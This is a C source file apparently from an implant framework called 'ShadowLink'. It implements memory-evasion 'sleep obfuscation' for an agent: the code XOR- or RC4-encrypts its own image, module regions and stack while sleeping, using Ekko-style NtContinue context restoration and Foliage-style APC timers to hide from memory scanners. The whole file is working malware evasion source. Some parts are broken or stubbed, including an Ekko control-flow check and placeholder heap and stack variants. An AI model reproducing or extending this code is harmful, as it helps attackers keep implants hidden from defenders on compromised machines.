/*
 * ShadowLink Sleep Obfuscation Implementation
 * Phase 11: Memory Evasion
 * 
 * Compiles with: gcc -c sleep_obfuscation.c -o sleep_obfuscation.o
 * 
 * References:
 * - Ekko: https://github.com/Cracked5pider/Ekko
 * - Foliage: https://github.com/SecIdiot/Foliage
 */

#include "sleep_obfuscation.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

// Link with psapi.lib
#pragma comment(lib, "psapi.lib")

// Global configuration
static SLEEP_CONFIG g_SleepConfig = {
    .method = SLEEP_METHOD_SIMPLE,
    .dwKeySize = 32,
    .bProtectStack = FALSE,
    .bProtectHeap = FALSE,
    .key = {0}
};

// NT function typedefs for Ekko
typedef NTSTATUS (NTAPI *NtContinue_t)(PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// RtlCaptureContext for Ekko
typedef VOID (NTAPI *RtlCaptureContext_t)(PCONTEXT);

// Global function pointers
static NtContinue_t pNtContinue = NULL;
static RtlCaptureContext_t pRtlCaptureContext = NULL;


// ============================================
// UTILITY FUNCTIONS
// ============================================

void generate_random_key(BYTE *key, DWORD size) {
    // Use hardware RNG if available (RDRAND)
    // Fallback to simple pseudo-random
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    
    srand((unsigned int)(counter.QuadPart ^ GetTickCount() ^ GetCurrentThreadId()));
    
    for (DWORD i = 0; i < size; i++) {
        key[i] = (BYTE)(rand() % 256);
    }
}

// XOR a memory region in-place
void xor_memory_region(PVOID pBase, SIZE_T size, BYTE *key, DWORD keySize) {
    BYTE *pMem = (BYTE*)pBase;
    
    for (SIZE_T i = 0; i < size; i++) {
        pMem[i] ^= key[i % keySize];
    }
}

// RC4-like stream cipher (faster for large regions)
void rc4_crypt(PVOID pBase, SIZE_T size, BYTE *key, DWORD keySize) {
    BYTE S[256];
    BYTE *pMem = (BYTE*)pBase;
    int i, j = 0;
    
    // Key scheduling
    for (i = 0; i < 256; i++) {
        S[i] = (BYTE)i;
    }
    
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keySize]) % 256;
        BYTE temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
    
    // Stream generation and XOR
    i = j = 0;
    for (SIZE_T k = 0; k < size; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        BYTE temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        pMem[k] ^= S[(S[i] + S[j]) % 256];
    }
}

// Get memory regions of current module (for encryption)
BOOL get_module_regions(HMODULE hModule, PPROTECTED_REGION *ppRegions, DWORD *pdwCount) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T offset = 0;
    DWORD count = 0;
    DWORD capacity = 16;
    
    PPROTECTED_REGION regions = (PPROTECTED_REGION)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, capacity * sizeof(PROTECTED_REGION));
    
    if (regions == NULL) return FALSE;
    
    // Get module base and size
    MODULEINFO modInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo))) {
        HeapFree(GetProcessHeap(), 0, regions);
        return FALSE;
    }
    
    // Enumerate memory regions
    while (offset < modInfo.SizeOfImage) {
        if (VirtualQuery((BYTE*)hModule + offset, &mbi, sizeof(mbi)) == 0) break;
        
        // Only protect writable regions or executable
        if ((mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_READ)) &&
            mbi.State == MEM_COMMIT) {
            
            if (count >= capacity) {
                capacity *= 2;
                PPROTECTED_REGION newRegions = (PPROTECTED_REGION)HeapReAlloc(
                    GetProcessHeap(), HEAP_ZERO_MEMORY, regions, capacity * sizeof(PROTECTED_REGION));
                if (newRegions == NULL) break;
                regions = newRegions;
            }
            
            regions[count].pBase = mbi.BaseAddress;
            regions[count].size = mbi.RegionSize;
            regions[count].originalProtect = mbi.Protect;
            count++;
        }
        
        offset += mbi.RegionSize;
    }
    
    *ppRegions = regions;
    *pdwCount = count;
    return TRUE;
}

void free_regions(PPROTECTED_REGION pRegions) {
    if (pRegions != NULL) {
        HeapFree(GetProcessHeap(), 0, pRegions);
    }
}


// ============================================
// SIMPLE SLEEP OBFUSCATION
// ============================================

// Basic technique: encrypt .data/.rdata sections during sleep
void sleep_simple(DWORD dwMilliseconds) {
    HMODULE hModule = GetModuleHandleA(NULL);
    PPROTECTED_REGION regions = NULL;
    DWORD regionCount = 0;
    
    // Generate random key for this sleep cycle
    BYTE key[32];
    generate_random_key(key, sizeof(key));
    
    // Get memory regions to protect
    if (!get_module_regions(hModule, &regions, &regionCount)) {
        // Fallback to normal sleep
        Sleep(dwMilliseconds);
        return;
    }
    
    // Encrypt regions
    for (DWORD i = 0; i < regionCount; i++) {
        DWORD oldProtect;
        if (VirtualProtect(regions[i].pBase, regions[i].size, PAGE_READWRITE, &oldProtect)) {
            xor_memory_region(regions[i].pBase, regions[i].size, key, sizeof(key));
            VirtualProtect(regions[i].pBase, regions[i].size, oldProtect, &oldProtect);
        }
    }
    
    // Sleep
    Sleep(dwMilliseconds);
    
    // Decrypt regions (same XOR operation)
    for (DWORD i = 0; i < regionCount; i++) {
        DWORD oldProtect;
        if (VirtualProtect(regions[i].pBase, regions[i].size, PAGE_READWRITE, &oldProtect)) {
            xor_memory_region(regions[i].pBase, regions[i].size, key, sizeof(key));
            VirtualProtect(regions[i].pBase, regions[i].size, oldProtect, &oldProtect);
        }
    }
    
    // Cleanup
    free_regions(regions);
    SecureZeroMemory(key, sizeof(key));
}


// ============================================
// EKKO SLEEP OBFUSCATION
// ============================================

/*
 * Ekko uses ROP (Return-Oriented Programming) to:
 * 1. Encrypt the agent's memory
 * 2. Wait using a timer callback
 * 3. Decrypt when timer fires
 * 
 * The key insight is using NtContinue to restore context,
 * which resumes execution after the sleep.
 */

// Timer callback context for Ekko
typedef struct _EKKO_CONTEXT {
    PVOID pImageBase;
    DWORD dwImageSize;
    BYTE key[32];
    CONTEXT ctxOriginal;
    BOOL bEncrypted;
} EKKO_CONTEXT, *PEKKO_CONTEXT;

// Global Ekko context (needed for callback)
static EKKO_CONTEXT g_EkkoContext = {0};

// Timer callback that decrypts and restores context
VOID CALLBACK EkkoTimerCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    PEKKO_CONTEXT pCtx = (PEKKO_CONTEXT)lpParam;
    
    if (pCtx == NULL || !pCtx->bEncrypted) return;
    
    // Decrypt image
    DWORD oldProtect;
    if (VirtualProtect(pCtx->pImageBase, pCtx->dwImageSize, PAGE_READWRITE, &oldProtect)) {
        xor_memory_region(pCtx->pImageBase, pCtx->dwImageSize, pCtx->key, 32);
        VirtualProtect(pCtx->pImageBase, pCtx->dwImageSize, oldProtect, &oldProtect);
    }
    
    pCtx->bEncrypted = FALSE;
    
    // Restore original context (this "returns" from sleep)
    if (pNtContinue != NULL) {
        pNtContinue(&pCtx->ctxOriginal, FALSE);
    }
}

void sleep_ekko(DWORD dwMilliseconds) {
    HMODULE hModule = GetModuleHandleA(NULL);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HANDLE hTimer = NULL;
    HANDLE hTimerQueue = NULL;
    
    // Resolve functions
    if (pNtContinue == NULL) {
        pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
    }
    if (pRtlCaptureContext == NULL) {
        pRtlCaptureContext = (RtlCaptureContext_t)GetProcAddress(hNtdll, "RtlCaptureContext");
    }
    
    if (pNtContinue == NULL || pRtlCaptureContext == NULL) {
        // Fallback to simple
        sleep_simple(dwMilliseconds);
        return;
    }
    
    // Get module info
    MODULEINFO modInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo))) {
        sleep_simple(dwMilliseconds);
        return;
    }
    
    // Setup Ekko context
    g_EkkoContext.pImageBase = modInfo.lpBaseOfDll;
    g_EkkoContext.dwImageSize = modInfo.SizeOfImage;
    generate_random_key(g_EkkoContext.key, 32);
    g_EkkoContext.bEncrypted = FALSE;
    
    // Capture current context
    pRtlCaptureContext(&g_EkkoContext.ctxOriginal);
    
    // Check if we're returning from sleep (context restored)
    if (g_EkkoContext.bEncrypted == FALSE && hTimer != NULL) {
        // We've returned from sleep
        DeleteTimerQueueTimer(NULL, hTimer, NULL);
        return;
    }
    
    // Create timer queue
    hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        sleep_simple(dwMilliseconds);
        return;
    }
    
    // Create timer
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, EkkoTimerCallback, 
                               &g_EkkoContext, dwMilliseconds, 0, 
                               WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE)) {
        DeleteTimerQueue(hTimerQueue);
        sleep_simple(dwMilliseconds);
        return;
    }
    
    // Encrypt image
    DWORD oldProtect;
    if (VirtualProtect(g_EkkoContext.pImageBase, g_EkkoContext.dwImageSize, 
                       PAGE_READWRITE, &oldProtect)) {
        xor_memory_region(g_EkkoContext.pImageBase, g_EkkoContext.dwImageSize, 
                         g_EkkoContext.key, 32);
        VirtualProtect(g_EkkoContext.pImageBase, g_EkkoContext.dwImageSize, 
                      oldProtect, &oldProtect);
    }
    
    g_EkkoContext.bEncrypted = TRUE;
    
    // Sleep and wait for timer callback to restore us
    // The timer callback will call NtContinue which returns us here
    SleepEx(dwMilliseconds + 1000, TRUE);  // Alertable sleep for APC
    
    // Cleanup
    DeleteTimerQueue(hTimerQueue);
    SecureZeroMemory(g_EkkoContext.key, 32);
}


// ============================================
// FOLIAGE SLEEP OBFUSCATION
// ============================================

/*
 * Foliage uses APC (Asynchronous Procedure Calls) queuing:
 * 1. Queue an APC to encrypt memory
 * 2. Enter alertable wait
 * 3. Timer fires, queues another APC to decrypt
 * 4. Resume execution
 */

typedef struct _FOLIAGE_CONTEXT {
    PVOID pImageBase;
    DWORD dwImageSize;
    BYTE key[32];
    BOOL bEncrypted;
    HANDLE hEvent;
} FOLIAGE_CONTEXT, *PFOLIAGE_CONTEXT;

static FOLIAGE_CONTEXT g_FoliageContext = {0};

// APC function to decrypt
VOID CALLBACK FoliageDecryptAPC(ULONG_PTR Parameter) {
    PFOLIAGE_CONTEXT pCtx = (PFOLIAGE_CONTEXT)Parameter;
    
    if (pCtx == NULL || !pCtx->bEncrypted) return;
    
    // Decrypt
    DWORD oldProtect;
    if (VirtualProtect(pCtx->pImageBase, pCtx->dwImageSize, PAGE_READWRITE, &oldProtect)) {
        xor_memory_region(pCtx->pImageBase, pCtx->dwImageSize, pCtx->key, 32);
        VirtualProtect(pCtx->pImageBase, pCtx->dwImageSize, oldProtect, &oldProtect);
    }
    
    pCtx->bEncrypted = FALSE;
    
    // Signal event
    if (pCtx->hEvent != NULL) {
        SetEvent(pCtx->hEvent);
    }
}

// Timer callback queues APC
VOID CALLBACK FoliageTimerCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    PFOLIAGE_CONTEXT pCtx = (PFOLIAGE_CONTEXT)lpParam;
    
    if (pCtx == NULL) return;
    
    // Queue APC to main thread
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, GetCurrentThreadId());
    if (hThread != NULL) {
        QueueUserAPC(FoliageDecryptAPC, hThread, (ULONG_PTR)pCtx);
        CloseHandle(hThread);
    }
}

void sleep_foliage(DWORD dwMilliseconds) {
    HMODULE hModule = GetModuleHandleA(NULL);
    HANDLE hTimer = NULL;
    HANDLE hTimerQueue = NULL;
    
    // Get module info
    MODULEINFO modInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo))) {
        sleep_simple(dwMilliseconds);
        return;
    }
    
    // Setup context
    g_FoliageContext.pImageBase = modInfo.lpBaseOfDll;
    g_FoliageContext.dwImageSize = modInfo.SizeOfImage;
    generate_random_key(g_FoliageContext.key, 32);
    g_FoliageContext.bEncrypted = FALSE;
    g_FoliageContext.hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    
    if (g_FoliageContext.hEvent == NULL) {
        sleep_simple(dwMilliseconds);
        return;
    }
    
    // Create timer to fire decrypt APC
    hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        CloseHandle(g_FoliageContext.hEvent);
        sleep_simple(dwMilliseconds);
        return;
    }
    
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, FoliageTimerCallback,
                               &g_FoliageContext, dwMilliseconds, 0,
                               WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE)) {
        DeleteTimerQueue(hTimerQueue);
        CloseHandle(g_FoliageContext.hEvent);
        sleep_simple(dwMilliseconds);
        return;
    }
    
    // Encrypt image
    DWORD oldProtect;
    if (VirtualProtect(g_FoliageContext.pImageBase, g_FoliageContext.dwImageSize,
                       PAGE_READWRITE, &oldProtect)) {
        xor_memory_region(g_FoliageContext.pImageBase, g_FoliageContext.dwImageSize,
                         g_FoliageContext.key, 32);
        VirtualProtect(g_FoliageContext.pImageBase, g_FoliageContext.dwImageSize,
                      oldProtect, &oldProtect);
    }
    
    g_FoliageContext.bEncrypted = TRUE;
    
    // Alertable wait for APC to fire
    while (g_FoliageContext.bEncrypted) {
        SleepEx(100, TRUE);  // Check every 100ms, alertable for APC
    }
    
    // Cleanup
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    CloseHandle(g_FoliageContext.hEvent);
    SecureZeroMemory(g_FoliageContext.key, 32);
}


// ============================================
// HEAP-BASED SLEEP OBFUSCATION
// ============================================

// Encrypt all heap allocations during sleep
void sleep_heap_based(DWORD dwMilliseconds) {
    // Get all heaps
    HANDLE heaps[100];
    DWORD heapCount = GetProcessHeaps(100, heaps);
    
    BYTE key[32];
    generate_random_key(key, sizeof(key));
    
    // This is a simplified version - full implementation would
    // enumerate heap entries and encrypt them
    // For now, fall back to simple
    sleep_simple(dwMilliseconds);
}


// ============================================
// MAIN SLEEP FUNCTION
// ============================================

void init_sleep_obfuscation(SLEEP_METHOD method) {
    g_SleepConfig.method = method;
    generate_random_key(g_SleepConfig.key, 32);
    
    // Load psapi.dll for GetModuleInformation
    LoadLibraryA("psapi.dll");
}

void obfuscated_sleep(DWORD dwMilliseconds) {
    switch (g_SleepConfig.method) {
        case SLEEP_METHOD_SIMPLE:
            sleep_simple(dwMilliseconds);
            break;
        
        case SLEEP_METHOD_EKKO:
            sleep_ekko(dwMilliseconds);
            break;
        
        case SLEEP_METHOD_FOLIAGE:
            sleep_foliage(dwMilliseconds);
            break;
        
        case SLEEP_METHOD_HEAP_BASED:
            sleep_heap_based(dwMilliseconds);
            break;
        
        case SLEEP_METHOD_NORMAL:
        default:
            Sleep(dwMilliseconds);
            break;
    }
}


// ============================================
// ALTERNATIVE: STACK-BASED SLEEP ENCRYPTION
// ============================================

/*
 * Encrypt the stack during sleep to hide function arguments,
 * local variables, and return addresses.
 */

void sleep_with_stack_encryption(DWORD dwMilliseconds) {
    // Get current stack pointer
    PVOID pStackBase;
    PVOID pStackLimit;
    NT_TIB *pTib;
    
#ifdef _WIN64
    pTib = (NT_TIB*)__readgsqword(0x30);
#else
    pTib = (NT_TIB*)__readfsdword(0x18);
#endif
    
    pStackBase = pTib->StackBase;
    pStackLimit = pTib->StackLimit;
    
    // Calculate current stack usage
    PVOID pCurrentStack;
#ifdef _MSC_VER
    // MSVC intrinsic
    pCurrentStack = (PVOID)_AddressOfReturnAddress();
#elif defined(__GNUC__)
    // GCC: use built-in
    pCurrentStack = __builtin_frame_address(0);
#else
    pCurrentStack = pStackLimit;  // Fallback
#endif
    
    SIZE_T stackSize = (SIZE_T)((BYTE*)pStackBase - (BYTE*)pCurrentStack);
    
    // Generate key
    BYTE key[32];
    generate_random_key(key, sizeof(key));
    
    // Note: Encrypting the current stack is dangerous
    // This is a conceptual implementation
    // In practice, you'd need careful handling of the active frame
    
    sleep_simple(dwMilliseconds);
}
